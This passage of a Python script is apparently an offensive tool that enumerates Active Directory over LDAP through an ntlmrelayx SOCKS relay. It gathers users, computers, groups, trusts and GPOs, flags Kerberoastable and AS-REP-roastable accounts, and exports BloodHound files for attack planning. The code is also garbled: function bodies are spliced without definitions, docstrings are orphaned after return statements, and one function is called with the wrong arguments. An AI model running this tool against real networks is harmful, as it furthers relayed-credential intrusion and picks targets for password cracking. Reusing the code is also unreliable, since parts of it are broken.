        print(f"[+] AS-REP roastable accounts saved to: {asrep_file}")

def convert_to_bloodhound_legacy(data, domain, output_dir):
    """
    Convert to BloodHound Legacy v4 format (compatible with BloodHound 4.2/4.3)
    
    Key differences from CE:
    - version: 4 (not 5)
    - Trust values are integers (not strings)
    - Methods bitmask for DCOnly
    """
    files_created = []
    
    meta = {
        "methods": DCONLY_BITMASK,
        "type": "",
        "count": 0,
        "version": 4  # Legacy v4
    }
    
    domain_upper = domain.upper()
    
    # 1. DOMAINS.JSON
    if 'domain_info' in data.get('data', {}):
        info = data['data']['domain_info']
        
        domains_data = {
            "data": [{
                "ObjectIdentifier": domain_upper,
                "Properties": {
                    "domain": domain_upper,
                    "name": domain_upper,
                    "distinguishedname": f"DC={domain.replace('.', ',DC=')}",
                    "domainsid": info.get('objectSid', f"S-1-5-21-{domain_upper}"),
                    "functionallevel": info.get('functional_level', 'Unknown'),
                    "description": f"Domain {domain}"
                },
                "Trusts": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }],
            "meta": dict(meta, type="domains", count=1)
        }
        
        # Add trusts with INTEGER values for Legacy
        if 'trusts' in data.get('data', {}):
            for trust in data['data']['trusts']:
                # Convert string values to integers
                direction_str = trust.get('trustDirection', 'Unknown')
                type_str = trust.get('trustType', 'Unknown')
                
                trust_obj = {
                    "TargetDomainSid": trust.get('objectSid', ''),
                    "TargetDomainName": trust.get('trustPartner', '').upper(),
                    "IsTransitive": True,
                    "SidFilteringEnabled": True,
                    "TrustDirection": TRUST_DIRECTION_MAP.get(direction_str, 0),  # INTEGER
                    "TrustType": TRUST_TYPE_MAP.get(type_str, 2)  # INTEGER
                }
                domains_data['data'][0]['Trusts'].append(trust_obj)
        
        with open(output_dir / 'domains.json', 'w') as f:
            safe_json_dump(domains_data, f, indent=2)
        files_created.append('domains.json')
    
    # 2. USERS.JSON
    if 'users' in data.get('data', {}):
        users_bh = []
        for user in data['data']['users']:
            user_obj = {
                "ObjectIdentifier": user.get('objectSid', user.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{user.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": user.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": user.get('sAMAccountName', ''),
                    "description": user.get('description', ''),
                    "enabled": user.get('enabled', True),
                    "pwdlastset": user.get('pwdLastSet', 0),
                    "lastlogon": user.get('lastLogon', 0),
                    "lastlogontimestamp": user.get('lastLogonTimestamp', 0),
                    "displayname": user.get('displayName', ''),
                    "email": user.get('mail', ''),
                    "title": user.get('title', ''),
                    "homedirectory": user.get('homeDirectory', ''),
                    "userpassword": None,
                    "admincount": bool(user.get('adminCount', 0)),
                    "sensitive": user.get('passwordNotRequired', False),
                    "dontreqpreauth": user.get('dontRequirePreauth', False),
                    "passwordnotreqd": user.get('passwordNotRequired', False),
                    "unconstraineddelegation": False,
                    "pwdneverexpires": False,
                    "trustedtoauth": user.get('trustedToAuth', False),
                    "hasspn": bool(user.get('servicePrincipalName')),
                    "serviceprincipalnames": user.get('servicePrincipalName', [])
                },
                "PrimaryGroupSid": user.get('primaryGroupID', ''),
                "AllowedToDelegate": user.get('allowedToDelegateTo', []),
                "SPNTargets": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []
            }
            users_bh.append(user_obj)
        
        users_data = {
            "data": users_bh,
            "meta": dict(meta, type="users", count=len(users_bh))
        }
        
        with open(output_dir / 'users.json', 'w') as f:
            safe_json_dump(users_data, f, indent=2)
        files_created.append('users.json')
    
    # 3. COMPUTERS.JSON
    if 'computers' in data.get('data', {}):
        computers_bh = []
        for computer in data['data']['computers']:
            comp_obj = {
                "ObjectIdentifier": computer.get('objectSid', computer.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": computer.get('dNSHostName', computer.get('sAMAccountName', '')).upper(),
                    "distinguishedname": computer.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": computer.get('sAMAccountName', ''),
                    "description": "",
                    "enabled": computer.get('enabled', True),
                    "unconstraineddelegation": computer.get('unconstrainedDelegation', False),
                    "trustedtoauth": computer.get('trustedToAuth', False),
                    "lastlogon": computer.get('lastLogon', 0),
                    "lastlogontimestamp": computer.get('lastLogonTimestamp', 0),
                    "pwdlastset": computer.get('pwdLastSet', 0),
                    "serviceprincipalnames": [],
                    "operatingsystem": computer.get('operatingSystem', ''),
                    "sidhistory": []
                },
                "PrimaryGroupSid": computer.get('primaryGroupID', ''),
                "AllowedToDelegate": computer.get('allowedToDelegateTo', []),
                "AllowedToAct": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []
            }
            computers_bh.append(comp_obj)
        
        computers_data = {
            "data": computers_bh,
            "meta": dict(meta, type="computers", count=len(computers_bh))
        }
        
        with open(output_dir / 'computers.json', 'w') as f:
            safe_json_dump(computers_data, f, indent=2)
        files_created.append('computers.json')
    
    # 4. GROUPS.JSON
    if 'groups' in data.get('data', {}):
        groups_bh = []
        for group in data['data']['groups']:
            group_obj = {
                "ObjectIdentifier": group.get('objectSid', group.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{group.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": group.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": group.get('sAMAccountName', ''),
                    "description": group.get('description', ''),
                    "admincount": bool(group.get('adminCount', 0)),
                    "highvalue": False
                },
                "Members": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            groups_bh.append(group_obj)
        
        groups_data = {
            "data": groups_bh,
            "meta": dict(meta, type="groups", count=len(groups_bh))
        }
        
        with open(output_dir / 'groups.json', 'w') as f:
            safe_json_dump(groups_data, f, indent=2)
        files_created.append('groups.json')
    
    # 5. GPOS.JSON
    if 'gpos' in data.get('data', {}):
        gpos_bh = []
        for gpo in data['data']['gpos']:
            gpo_obj = {
                "ObjectIdentifier": gpo.get('name', '').strip('{}'),
                "Properties": {
                    "domain": domain_upper,
                    "name": gpo.get('displayName', 'UNKNOWN') + "@" + domain_upper,
                    "distinguishedname": gpo.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "gpcpath": gpo.get('gPCFileSysPath', ''),
                    "description": ""
                },
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            gpos_bh.append(gpo_obj)
        
        gpos_data = {
            "data": gpos_bh,
            "meta": dict(meta, type="gpos", count=len(gpos_bh))
        }
        
        with open(output_dir / 'gpos.json', 'w') as f:
            safe_json_dump(gpos_data, f, indent=2)
        files_created.append('gpos.json')
    
    # 6. OUS.JSON
    if 'ous' in data.get('data', {}):
        ous_bh = []
        for ou in data['data']['ous']:
            ou_obj = {
                "ObjectIdentifier": ou.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": ou.get('name', 'UNKNOWN'),
                    "distinguishedname": ou.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "description": ou.get('description', ''),
                    "blocksinheritance": False
                },
                "Links": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            ous_bh.append(ou_obj)
        
        ous_data = {
            "data": ous_bh,
            "meta": dict(meta, type="ous", count=len(ous_bh))
        }
        
        with open(output_dir / 'ous.json', 'w') as f:
            safe_json_dump(ous_data, f, indent=2)
        files_created.append('ous.json')
    
    # 7. CONTAINERS.JSON
    if 'containers' in data.get('data', {}):
        containers_bh = []
        for container in data['data']['containers']:
            cont_obj = {
                "ObjectIdentifier": container.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": container.get('name', 'UNKNOWN'),
                    "distinguishedname": container.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "description": container.get('description', '')
                },
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            containers_bh.append(cont_obj)
        
        containers_data = {
            "data": containers_bh,
            "meta": dict(meta, type="containers", count=len(containers_bh))
        }
        
        with open(output_dir / 'containers.json', 'w') as f:
            safe_json_dump(containers_data, f, indent=2)
        files_created.append('containers.json')
    
    return files_created

def convert_to_bloodhound_ce(data, domain, output_dir):
    """
    Convert our data format to BloodHound CE compatible JSON files
    
    Creates separate files for each object type as BloodHound CE expects
    """
    files_created = []
    
    meta = {
        "methods": 0,
        "type": "azure",
        "count": 0,
        "version": 5
    }
    
    domain_upper = domain.upper()
    
    # 1. DOMAINS.JSON
    if 'domain_info' in data.get('data', {}):
        info = data['data']['domain_info']
        
        domains_data = {
            "data": [{
                "ObjectIdentifier": domain_upper,
                "Properties": {
                    "domain": domain_upper,
                    "name": domain_upper,
                    "distinguishedname": f"DC={domain.replace('.', ',DC=')}",
                    "domainsid": info.get('objectSid', f"S-1-5-21-{domain_upper}"),
                    "functionallevel": info.get('functional_level', 'Unknown'),
                    "description": f"Domain {domain}"
                },
                "Trusts": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }],
            "meta": dict(meta, type="domains", count=1)
        }
        
        # Add trusts
        if 'trusts' in data.get('data', {}):
            for trust in data['data']['trusts']:
                trust_obj = {
                    "TargetDomainSid": trust.get('objectSid', ''),
                    "TargetDomainName": trust.get('trustPartner', '').upper(),
                    "IsTransitive": True,
                    "SidFilteringEnabled": True,
                    "TrustDirection": trust.get('trustDirection', 'Unknown'),
                    "TrustType": trust.get('trustType', 'Unknown')
                }
                domains_data['data'][0]['Trusts'].append(trust_obj)
        
        with open(output_dir / 'domains.json', 'w') as f:
            safe_json_dump(domains_data, f, indent=2)
        files_created.append('domains.json')
    
    # 2. USERS.JSON
    if 'users' in data.get('data', {}):
        users_bh = []
        for user in data['data']['users']:
            user_obj = {
                "ObjectIdentifier": user.get('objectSid', user.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{user.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": user.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": user.get('sAMAccountName', ''),
                    "description": user.get('description', ''),
                    "enabled": user.get('enabled', True),
                    "pwdlastset": user.get('pwdLastSet', 0),
                    "lastlogon": user.get('lastLogon', 0),
                    "lastlogontimestamp": user.get('lastLogonTimestamp', 0),
                    "displayname": user.get('displayName', ''),
                    "email": user.get('mail', ''),
                    "title": user.get('title', ''),
                    "homedirectory": user.get('homeDirectory', ''),
                    "userpassword": None,
                    "admincount": bool(user.get('adminCount', 0)),
                    "sensitive": user.get('passwordNotRequired', False),
                    "dontreqpreauth": user.get('dontRequirePreauth', False),
                    "passwordnotreqd": user.get('passwordNotRequired', False),
                    "unconstraineddelegation": False,
                    "pwdneverexpires": False,
                    "trustedtoauth": user.get('trustedToAuth', False),
                    "hasspn": bool(user.get('servicePrincipalName')),
                    "serviceprincipalnames": user.get('servicePrincipalName', [])
                },
                "PrimaryGroupSid": user.get('primaryGroupID', ''),
                "AllowedToDelegate": user.get('allowedToDelegateTo', []),
                "SPNTargets": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []  # Would need ACL parsing
            }
            users_bh.append(user_obj)
        
        users_data = {
            "data": users_bh,
            "meta": dict(meta, type="users", count=len(users_bh))
        }
        
        with open(output_dir / 'users.json', 'w') as f:
            safe_json_dump(users_data, f, indent=2)
        files_created.append('users.json')
    
    # 3. COMPUTERS.JSON
    if 'computers' in data.get('data', {}):
        computers_bh = []
        for computer in data['data']['computers']:
            comp_obj = {
                "ObjectIdentifier": computer.get('objectSid', computer.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": computer.get('dNSHostName', computer.get('sAMAccountName', '')).upper(),
                    "distinguishedname": computer.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": computer.get('sAMAccountName', ''),
                    "description": "",
                    "enabled": computer.get('enabled', True),
                    "unconstraineddelegation": computer.get('unconstrainedDelegation', False),
                    "trustedtoauth": computer.get('trustedToAuth', False),
                    "lastlogon": computer.get('lastLogon', 0),
                    "lastlogontimestamp": computer.get('lastLogonTimestamp', 0),
                    "pwdlastset": computer.get('pwdLastSet', 0),
                    "serviceprincipalnames": [],
                    "operatingsystem": computer.get('operatingSystem', ''),
                    "sidhistory": []
                },
                "PrimaryGroupSid": computer.get('primaryGroupID', ''),
                "AllowedToDelegate": computer.get('allowedToDelegateTo', []),
                "AllowedToAct": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []
            }
            computers_bh.append(comp_obj)
        
        computers_data = {
            "data": computers_bh,
            "meta": dict(meta, type="computers", count=len(computers_bh))
        }
        
        with open(output_dir / 'computers.json', 'w') as f:
            safe_json_dump(computers_data, f, indent=2)
        files_created.append('computers.json')
    
    # 4. GROUPS.JSON
    if 'groups' in data.get('data', {}):
        groups_bh = []
        for group in data['data']['groups']:
            group_obj = {
                "ObjectIdentifier": group.get('objectSid', group.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{group.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": group.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": group.get('sAMAccountName', ''),
                    "description": group.get('description', ''),
                    "admincount": bool(group.get('adminCount', 0)),
                    "highvalue": False  # Would need well-known SID check
                },
                "Members": [],  # Would need to resolve from 'member' DNs
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            groups_bh.append(group_obj)
        
        groups_data = {
            "data": groups_bh,
            "meta": dict(meta, type="groups", count=len(groups_bh))
        }
        
        with open(output_dir / 'groups.json', 'w') as f:
            safe_json_dump(groups_data, f, indent=2)
        files_created.append('groups.json')
    
    # 5. GPOS.JSON
    if 'gpos' in data.get('data', {}):
        gpos_bh = []
        for gpo in data['data']['gpos']:
            gpo_obj = {
                "ObjectIdentifier": gpo.get('name', '').strip('{}'),
                "Properties": {
                    "domain": domain_upper,
                    "name": gpo.get('displayName', 'UNKNOWN') + "@" + domain_upper,
                    "distinguishedname": gpo.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "gpcpath": gpo.get('gPCFileSysPath', ''),
                    "description": ""
                },
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            gpos_bh.append(gpo_obj)
        
        gpos_data = {
            "data": gpos_bh,
            "meta": dict(meta, type="gpos", count=len(gpos_bh))
        }
        
        with open(output_dir / 'gpos.json', 'w') as f:
            safe_json_dump(gpos_data, f, indent=2)
        files_created.append('gpos.json')
    
    # 6. OUS.JSON
    if 'ous' in data.get('data', {}):
        ous_bh = []
        for ou in data['data']['ous']:
            ou_obj = {
                "ObjectIdentifier": ou.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": ou.get('name', 'UNKNOWN'),
                    "distinguishedname": ou.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "description": ou.get('description', ''),
                    "blocksinheritance": False
                },
                "Links": [],  # Would parse from gPLink
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            ous_bh.append(ou_obj)
        
        ous_data = {
            "data": ous_bh,
            "meta": dict(meta, type="ous", count=len(ous_bh))
        }
        
        with open(output_dir / 'ous.json', 'w') as f:
            safe_json_dump(ous_data, f, indent=2)
        files_created.append('ous.json')
    
    # 7. CONTAINERS.JSON
    if 'containers' in data.get('data', {}):
        containers_bh = []
        for container in data['data']['containers']:
            cont_obj = {
                "ObjectIdentifier": container.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": container.get('name', 'UNKNOWN'),
                    "distinguishedname": container.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "description": container.get('description', '')
                },
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            containers_bh.append(cont_obj)
        
        containers_data = {
            "data": containers_bh,
            "meta": dict(meta, type="containers", count=len(containers_bh))
        }
        
        with open(output_dir / 'containers.json', 'w') as f:
            safe_json_dump(containers_data, f, indent=2)
        files_created.append('containers.json')
    
    return files_created
    """Save output in BOFHound-compatible JSON format and simple text files"""
    try:
        # Use current directory if output_dir is just a filename
        if output_dir and not ('/' in output_dir or '\\' in output_dir):
            # It's just a filename, use current directory
            output_path = Path.cwd()
            base_name = output_dir.replace('.json', '').replace('.txt', '')
        else:
            # It's a directory path
            output_path = Path(output_dir) if output_dir else Path.cwd()
            output_path.mkdir(parents=True, exist_ok=True)
            base_name = None
        
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        
        # Convert to BloodHound CE format if requested
        if bloodhound_ce:
            print(f"\n[*] Converting to BloodHound CE format...")
            data = convert_to_bloodhound_ce(data, domain)
            format_suffix = "_bhce"
        else:
            format_suffix = ""
        
        # Save JSON
        if base_name:
            json_filename = output_path / f"{base_name}{format_suffix}_{timestamp}.json"
        else:
            json_filename = output_path / f"ldap_enum_{domain}{format_suffix}_{timestamp}.json"
        
        with open(json_filename, 'w') as f:
            safe_json_dump(data, f, indent=2)
        
        if bloodhound_ce:
            print(f"[+] BloodHound CE JSON saved to: {json_filename}")
            print(f"[*] Import to BloodHound CE via GUI or API")
        else:
            print(f"\n[+] JSON output saved to: {json_filename}")
            print(f"[*] BOFHound import: bofhound -i {json_filename}")
        
        # Save simple text files (only for non-BHCE format)
        if not bloodhound_ce:
            if 'users' in data['data'] and data['data']['users']:
                if base_name:
                    users_file = output_path / f"{base_name}_users_{timestamp}.txt"
                else:
                    users_file = output_path / f"users_{domain}_{timestamp}.txt"
                
                with open(users_file, 'w') as f:
                    for user in data['data']['users']:
                        sam = user.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] Users list saved to: {users_file}")
            
            if 'computers' in data['data'] and data['data']['computers']:
                if base_name:
                    computers_file = output_path / f"{base_name}_computers_{timestamp}.txt"
                else:
                    computers_file = output_path / f"computers_{domain}_{timestamp}.txt"
                
                with open(computers_file, 'w') as f:
                    for computer in data['data']['computers']:
                        # Prefer FQDN, fall back to sAMAccountName
                        hostname = computer.get('dNSHostName') or computer.get('sAMAccountName', '')
                        if hostname:
                            f.write(f"{hostname}\n")
                print(f"[+] Computers list saved to: {computers_file}")
            
            if 'kerberoastable' in data['data'] and data['data']['kerberoastable']:
                if base_name:
                    kerb_file = output_path / f"{base_name}_kerberoastable_{timestamp}.txt"
                else:
                    kerb_file = output_path / f"kerberoastable_{domain}_{timestamp}.txt"
                
                with open(kerb_file, 'w') as f:
                    for account in data['data']['kerberoastable']:
                        sam = account.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] Kerberoastable accounts saved to: {kerb_file}")
            
            if 'asreproastable' in data['data'] and data['data']['asreproastable']:
                if base_name:
                    asrep_file = output_path / f"{base_name}_asreproastable_{timestamp}.txt"
                else:
                    asrep_file = output_path / f"asreproastable_{domain}_{timestamp}.txt"
                
                with open(asrep_file, 'w') as f:
                    for account in data['data']['asreproastable']:
                        sam = account.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] AS-REP roastable accounts saved to: {asrep_file}")
        
    except Exception as e:
        print(f"[-] Error saving output: {e}")
        import traceback
        traceback.print_exc()

def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_dir=None, 
                   enum_users=False, enum_computers=False, enum_groups=False, 
                   enum_trusts=False, enum_gpos=False, enum_ous=False, enum_containers=False,
                   enum_kerberoastable=False, enum_asreproast=False, 
                   enum_domain_info=False, enum_all=False, output_format='legacy', 
                   timeout=600):
    """
    Enumerate LDAP using ldap3 with NTLM authentication
    This mimics how Certipy connects and works with ntlmrelayx SOCKS
    """
    
    # If enum_all, enable everything
    if enum_all:
        enum_users = enum_computers = enum_groups = True
        enum_trusts = enum_gpos = enum_ous = enum_containers = True
        enum_kerberoastable = enum_asreproast = enum_domain_info = True
    
    # Storage for BOFHound output
    bofhound_data = {
        "meta": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "dc": host,
            "tool": "ldap_ntlm_enum"
        },
        "data": {}
    }
    
    # Format username for NTLM: DOMAIN\username
    ntlm_user = f"{domain}\\{username}"
    
    print(f"[*] Connecting to {host}:{port}")
    print(f"[*] Using NTLM authentication as: {ntlm_user}")
    print(f"[*] LDAP timeout: {timeout}s (use -t to adjust for slow SOCKS connections)")
    
    # Create server (no SSL, no server info gathering)
    server = Server(host, port=port, get_info=None, connect_timeout=30)
    
    # Create connection with NTLM authentication
    # Use default SYNC strategy (like Certipy) - RESTARTABLE doesn't work with SOCKS
    conn = Connection(
        server,
        user=ntlm_user,
        password=password,
        authentication=NTLM,
        # No client_strategy - uses SYNC by default like Certipy
        auto_bind=False,
        auto_referrals=False,  # Certipy uses this
        raise_exceptions=False,
        receive_timeout=timeout,  # Configurable timeout for SOCKS (default 600s)
        return_empty_attributes=False
    )
    
    # Bind
    print(f"[*] Binding...")
    if not conn.bind():
        print(f"[-] Bind failed: {conn.result}")
        return False
    
    print(f"[+] Bind successful!")
    
    # Auto-detect base DN if not provided
    if not base_dn:
        print(f"\n[*] Base DN not provided, auto-detecting...")
        base_dn = get_base_dn(conn, domain)
        if not base_dn:
            print(f"[-] Could not determine base DN")
            return False
    else:
        print(f"[*] Using provided base DN: {base_dn}")
    
    # Get configuration path for some queries
    config_path = f"CN=Configuration,{base_dn}"
    
    # Domain Info
    if enum_domain_info:
        print(f"\n[*] Enumerating domain information...")
        domain_data = get_domain_info(conn, base_dn)
        if domain_data:
            bofhound_data["data"]["domain_info"] = domain_data
            print(f"[+] Domain Info:")
            for key, value in domain_data.items():
                print(f"    {key}: {value}")
    
    # Users
    if enum_users:
        print(f"\n[*] Enumerating users...")
        users = get_users(conn, base_dn)
        bofhound_data["data"]["users"] = users
        print(f"[+] Found {len(users)} users")
        display_users(users)
    
    # Computers
    if enum_computers:
        print(f"\n[*] Enumerating computers...")
        computers = get_computers(conn, base_dn)
        bofhound_data["data"]["computers"] = computers
        print(f"[+] Found {len(computers)} computers")
        display_computers(computers)
    
    # Groups
    if enum_groups:
        print(f"\n[*] Enumerating groups...")
        groups = get_groups(conn, base_dn)
        bofhound_data["data"]["groups"] = groups
        print(f"[+] Found {len(groups)} groups")
        display_groups(groups)
    
    # Trusts
    if enum_trusts:
        print(f"\n[*] Enumerating trusts...")
        trusts = get_trusts(conn, base_dn)
        bofhound_data["data"]["trusts"] = trusts
        print(f"[+] Found {len(trusts)} trusts")
        display_trusts(trusts)
    
    # GPOs
    if enum_gpos:
        print(f"\n[*] Enumerating GPOs...")
        gpos = get_gpos(conn, base_dn)
        bofhound_data["data"]["gpos"] = gpos
        print(f"[+] Found {len(gpos)} GPOs")
    
    # OUs
    if enum_ous:
        print(f"\n[*] Enumerating OUs...")
        ous = get_ous(conn, base_dn)
        bofhound_data["data"]["ous"] = ous
        print(f"[+] Found {len(ous)} OUs")
    
    # Containers
    if enum_containers:
        print(f"\n[*] Enumerating containers...")
        containers = get_containers(conn, base_dn)
        bofhound_data["data"]["containers"] = containers
        print(f"[+] Found {len(containers)} containers")
    
    # Kerberoastable
    if enum_kerberoastable:
        print(f"\n[*] Enumerating Kerberoastable accounts...")
        kerberoastable = get_kerberoastable(conn, base_dn)
        bofhound_data["data"]["kerberoastable"] = kerberoastable
        print(f"[+] Found {len(kerberoastable)} Kerberoastable accounts")
        display_kerberoastable(kerberoastable)
    
    # AS-REP Roastable
    if enum_asreproast:
        print(f"\n[*] Enumerating AS-REP roastable accounts...")
        asreproastable = get_asreproastable(conn, base_dn)
        bofhound_data["data"]["asreproastable"] = asreproastable
        print(f"[+] Found {len(asreproastable)} AS-REP roastable accounts")
        display_asreproastable(asreproastable)
    
    conn.unbind()
    
    # Save output
    if output_dir:
        save_output(bofhound_data, output_dir, domain, output_format=output_format)
    
    return True
    """
    Enumerate LDAP using ldap3 with NTLM authentication
    This mimics how Certipy connects
    """
    
    # Format username for NTLM: DOMAIN\username
    ntlm_user = f"{domain}\\{username}"
    
    print(f"[*] Connecting to {host}:{port}")
    print(f"[*] Using NTLM authentication as: {ntlm_user}")
    
    # Create server (no SSL, no server info gathering)
    server = Server(host, port=port, get_info=None, connect_timeout=30)
    
    # Create connection with NTLM authentication
    # Use default SYNC strategy (like Certipy) - RESTARTABLE doesn't work with SOCKS
    conn = Connection(
        server,
        user=ntlm_user,
        password=password,
        authentication=NTLM,
        # No client_strategy - uses SYNC by default like Certipy
        auto_bind=False,
        auto_referrals=False,  # Certipy uses this
        raise_exceptions=False,
        receive_timeout=timeout,  # Configurable timeout for SOCKS (default 600s)
        return_empty_attributes=False
    )
    
    # Bind
    print(f"[*] Binding...")
    if not conn.bind():
        print(f"[-] Bind failed: {conn.result}")
        return False
    
    print(f"[+] Bind successful!")
    print(f"    Result: {conn.result}")
    
    # Auto-detect base DN if not provided
    if not base_dn:
        print(f"\n[*] Base DN not provided, auto-detecting...")
        base_dn = get_base_dn(conn, domain)
        if not base_dn:
            print(f"[-] Could not determine base DN")
            return False
    else:
        print(f"[*] Using provided base DN: {base_dn}")
    
def main():
    parser = argparse.ArgumentParser(
        description='LDAP Enumeration via ntlmrelayx SOCKS (BOFHound compatible)',
        epilog='''
Examples:
  # Full enumeration (all queries)
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all -o /tmp/output

  # Specific queries
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --users --computers
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --asreproast
  
  # With manual base DN
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe -b "DC=contoso,DC=local" --all
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Connection options
    parser.add_argument('-H', '--host', required=True, help='LDAP server IP')
    parser.add_argument('-p', '--port', type=int, default=389, help='LDAP port (default: 389)')
    parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., CONTOSO or contoso.local)')
    parser.add_argument('-u', '--username', required=True, help='Username (from ntlmrelayx SOCKS session)')
    parser.add_argument('-P', '--password', default='dummy', help='Password (default: dummy - ignored by SOCKS)')
    parser.add_argument('-b', '--base-dn', help='Base DN (auto-detected if not provided)')
    parser.add_argument('-t', '--timeout', type=int, default=600, 
                       help='LDAP receive timeout in seconds (default: 600 for SOCKS)')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output directory for results')
    
    # Output format options (mutually exclusive)
    format_group = parser.add_mutually_exclusive_group()
    format_group.add_argument('--bloodhound-ce', action='store_true', 
                             help='Output in BloodHound CE v5 format')
    format_group.add_argument('--bofhound', action='store_true',
                             help='Output in BOFHound format (single JSON file)')
    # Default is BloodHound Legacy v4 format
    
    # Enumeration options
    enum_group = parser.add_argument_group('enumeration options')
    enum_group.add_argument('--all', action='store_true', help='Enumerate everything (default if no options specified)')
    enum_group.add_argument('--domain-info', action='store_true', help='Get domain info (functional level, MAQ, password policy)')
    enum_group.add_argument('--users', action='store_true', help='Enumerate all users')
    enum_group.add_argument('--computers', action='store_true', help='Enumerate all computers')
    enum_group.add_argument('--groups', action='store_true', help='Enumerate all groups')
    enum_group.add_argument('--trusts', action='store_true', help='Enumerate domain trusts')
    enum_group.add_argument('--gpos', action='store_true', help='Enumerate GPOs')
    enum_group.add_argument('--ous', action='store_true', help='Enumerate OUs')
    enum_group.add_argument('--containers', action='store_true', help='Enumerate containers')
    enum_group.add_argument('--kerberoastable', action='store_true', help='Find Kerberoastable accounts (users with SPN)')
    enum_group.add_argument('--asreproast', action='store_true', help='Find AS-REP roastable accounts (no pre-auth)')
    
    args = parser.parse_args()
    
    # If no enumeration options specified, default to --all
    if not any([args.all, args.domain_info, args.users, args.computers, args.groups, 
                args.trusts, args.gpos, args.ous, args.containers, 
                args.kerberoastable, args.asreproast]):
        args.all = True
    
    # Determine output format
    if args.bloodhound_ce:
        output_format = 'ce'
    elif args.bofhound:
        output_format = 'bofhound'
    else:
        output_format = 'legacy'  # Default: BloodHound Legacy v4
    
    print("=" * 70)
    print("LDAP Enumeration via ntlmrelayx SOCKS (ldap3 + NTLM)")
    print("=" * 70)
    print()
    print("NOTE: This script works with ntlmrelayx SOCKS proxy when other")
    print("      tools fail. Uses Certipy's LDAP connection method.")
    print()
    
    if output_format == 'legacy':
        print(f"[*] Output format: BloodHound Legacy v4 (compatible with BH 4.2/4.3)")
    elif output_format == 'ce':
        print(f"[*] Output format: BloodHound CE v5")
    elif output_format == 'bofhound':
        print(f"[*] Output format: BOFHound")
    print()
    
    try:
        enumerate_ldap(
            host=args.host,
            port=args.port,
            domain=args.domain,
            username=args.username,
            password=args.password,
            base_dn=args.base_dn,
            output_dir=args.output,
            enum_users=args.users,
            enum_computers=args.computers,
            enum_groups=args.groups,
            enum_trusts=args.trusts,
            enum_gpos=args.gpos,
            enum_ous=args.ous,
            enum_containers=args.containers,
            enum_kerberoastable=args.kerberoastable,
            enum_asreproast=args.asreproast,
            enum_domain_info=args.domain_info,
            enum_all=args.all,
            output_format=output_format,
            timeout=args.timeout
        )
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
